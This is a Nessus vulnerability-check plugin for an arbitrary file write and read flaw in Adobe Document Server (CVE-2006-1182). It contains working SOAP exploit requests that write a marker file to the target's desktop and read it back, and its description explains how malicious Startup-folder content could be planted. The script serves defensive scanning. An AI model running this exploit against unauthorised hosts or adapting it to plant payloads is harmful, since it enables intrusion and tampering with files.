#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21100);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2015/09/24 20:59:27 $");

  script_cve_id("CVE-2006-1182");
  script_bugtraq_id(17113);
  script_osvdb_id(23924);

  script_name(english:"Adobe Document Server File URI Arbitrary Resource Manipulation");
  script_summary(english:"Tries to write to a file using Adobe Document Server");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple flaws." );
  script_set_attribute(attribute:"description", value:
"The remote host is running Adobe Document Server, a server that
dynamically creates and manipulates PDF documents as well as graphic
images. 

The version of Adobe Document Server installed on the remote host
allows saving PDF and XML documents as well as most types of image
files using file URIs to arbitrary locations on the affected host and
with arbitrary extensions.  An unauthenticated, remote attacker may be
able to leverage this flaw to write a graphics image with malicious
JavaScript as metadata into the Startup folders to be executed
whenever a user logs in. 

Additionally, it lets an attacker retrieve arbitrary PDF files, XML
documents, and most types of image files, which may result in the
disclosure of sensitive information." );
  script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2005-28/advisory/" );
  # http://web.archive.org/web/20060317200829/http://www.adobe.com/support/techdocs/332989.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a099b043" );
  script_set_attribute(attribute:"solution", value:
"Harden the application's configuration as described in the
'server/tools/security/readme.txt' file included in the distribution
as well as the vendor advisory above." );
  script_set_cvss_base_vector("CVSS2#AV:L/AC:H/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/18");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/15");
  script_set_attribute(attribute:"patch_publication_date", value: "2006/03/15");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:document_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8019);
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8019);

# Check whether the script exists.
r = http_send_recv3(method:"GET", item:"/altercast/AlterCast", port:port, exit_on_fail: 1);
res = r[2];

# If it does...
if ("<title>Adobe Server Web Services" >< res)
{
  # Exploit data.
  magic = string(SCRIPT_NAME, " created this file at ", unixtime());
  file = string("C:/Documents and Settings/All Users/Desktop/NESSUS-README.xml");

  # Write to a file.
  postdata = string(
    '<?xml version="1.0" encoding="utf-8"?>\n',
    "<soap:Envelope\n",
    '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n',
    '    xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n',
    '    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
    "  <soap:Body>\n",
    '    <request xmlns="http://ns.adobe.com/altercast/1.5/">\n',
    "     <commands>\n",
    "       &lt;commands&gt;\n",
    "         &lt;loadContent source=&quot;nessus&quot; /&gt;\n",
    "         &lt;saveContent name=&quot;file:///", file, "&quot; /&gt;\n",
    "       &lt;/commands&gt;\n",
    "     </commands>\n",
    "     <files>\n",
    "       <file>\n",
    "         <name>nessus</name>\n",
    "         <data>", base64(str:string("<nessus>", magic, "</nessus>")), "</data>\n",
    "       </file>\n",
    "     </files>\n",
    "    </request>\n",
    "  </soap:Body>\n",
    "</soap:Envelope>\n"
  );
  r = http_send_recv3(method:"POST", item:"/altercast/AlterCast", version:11, port: port,
    add_headers: make_array("Content-Type", "text/xml; charset=utf-8",
    'SOAPAction', '"http://ns.adobe.com/altercast/1.5/Execute"'),
    data: postdata, exit_on_fail: 1 );
  res = r[2];

  # Read the file back.
  postdata = string(
    '<?xml version="1.0" encoding="utf-8"?>\n',
    "<soap:Envelope\n",
    '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n',
    '    xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n',
    '    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
    "  <soap:Body>\n",
    '    <request xmlns="http://ns.adobe.com/altercast/1.5/">\n',
    "     <commands>\n",
    "       &lt;commands&gt;\n",
    "         &lt;loadContent source=&quot;file:///", file, "&quot; /&gt;\n",
    "       &lt;/commands&gt;\n",
    "     </commands>\n",
    "    </request>\n",
    "  </soap:Body>\n",
    "</soap:Envelope>\n"
  );
  r = http_send_recv3(method:"POST", item: "/altercast/AlterCast", version: 11, port: port,
    add_headers: make_array("Content-Type", "text/xml; charset=utf-8",
     'SOAPAction', '"http://ns.adobe.com/altercast/1.5/Execute"'),
    data: postdata, exit_on_fail: 1 );
  res = r[2];

  # If the response has a SOAP body...
  if ("<soap:Body>" >< res)
  {
    # Extract and decode the data.
    data = strstr(res, "<data>");
    if (data) data = data - "<data>";
    if (data) data = data - strstr(data, "</data>");
    if (data)
    {
      contents = base64_decode(str:data);

      # There's a problem if our magic string is in the contents.
      if (magic >< contents)
      {
        report = string(
          "Nessus was able to write to the following file on the remote host :\n",
          "\n",
          "  ", file
        );
        security_note(port:port, extra:report);
      }
    }
  }
}
